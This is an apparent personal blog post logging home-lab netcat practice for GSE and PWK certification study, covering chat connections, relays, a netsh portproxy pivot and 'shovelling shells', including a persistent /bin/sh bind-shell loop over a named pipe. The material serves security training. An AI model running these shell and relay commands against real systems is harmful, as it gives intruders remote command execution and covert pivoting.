---
layout: post
title: Netcat practice
category: Tools
author: adricnet
---

This morning with much coffee I'm working between email to practice netcat between hosts for GSE, PWK, and generally building good character.

**Refs**

* https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem
* http://wiki.securityweekly.com/wiki/index.php/Episode195#Tech_Segment:_Crazy-Ass_Netcat_Relays_for_Fun_and_Profit
* PWK Lab Manual (private)
* man nc (openbsd)
* sc and netsh from: https://securelist.com/blog/research/77403/fileless-attacks-against-enterprise-networks/

**Hosts**

* Archie: Win10 HP ProBook w/ VirtualBox: 192.168.0.15
  * Seven: Win7 IE11 VM provided by [Microsoft](https://modern.ie/): 10.0.2.15
* Gray: Chromebook (x64) w/ crouton 192.68.0.13
  * xenial: an Ubuntu chroot (Crouton)

Tasks
--

0. Networks up, Firewalls down, for class

  * [x] xenial : installed ufw, disabled firewall
  * [x] Seven : works better with DHCP on 
  * [.] ping xenial from seven
  * [.] ping archie from seven


1. Smoke tests

  * [x] nc on Archie listening (chat), nc on xenial connect 
  * [x] nc on Archie listening -e, nc on xenial connect
  * [x] nc on xenial listening, xenial connecting ... checking iptables/ufw 
  * [!] nc on Seven listening, nc on xenial connect? ... NAT
  * [x] nc on xenial listening, nc on Seven connect
  * [x] nc on xenial listening chat/text, nc relay on archie, nc on Seven connect
    * [!] ```seven> nc -v 192.168.0.15 4433``` to ```archie> nc -v -l -p 4433 | nc 192.168.0.13 4444``` no workee in PS
    * [x] ```seven> nc -v 192.168.0.15 4433``` to ```archie> nc -v -l -p 4433 | nc 192.168.0.13 4444``` works in cmd
    * [x] seven to archie to text file, text file into nc to xenial works fine
  * [x] nc on archie listening, nc on Seven connect
  * [!] nc on Seven listening, nc on archie connecting ... NAT
  * [x] while loop listener on xenial, persistent one way (L) relay on archie -> xenial 
 
1. Shovelling shells

  * [x] xenial persistent listen (while), archie relay (L), push shell output from archie
  * [x] xenial shovel shell from archie : ```xenial> while [ 1 ]; do cat /tmp/pipe | /bin/sh -i 2>&1 | nc -lp 4443 > /tmp/pipe; done```
  * [x] xenial shovel shell from seven (thru archie's persistent relay)
  * [x] seven push half a shell out to xenial (thru NAT)
  * [x] seven push half a shell out to xenial thru archie relay
  * [ ] 

1. Port proxy in netsh?

  * [.] seems to work as a relay just fine, running on archie:
  
```
netsh interface portproxy>add v4tov4 listenport=3333 connectaddress=192.168.0.8 connectport=8888 listenaddress=0.0.0.0

netsh interface portproxy>show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
0.0.0.0         3333        192.168.0.8     8888
```
Connecting from archie to the xenial chroot on Chromebook gray for chat
```
C:\Users\adric\Downloads>nc -v 192.168.0.15 3333
archimedes [192.168.0.15] 3333 (?) open
boo-weep?
```

```
xenial> nc -vlp 8888
Connection ...
boo-weep?
```
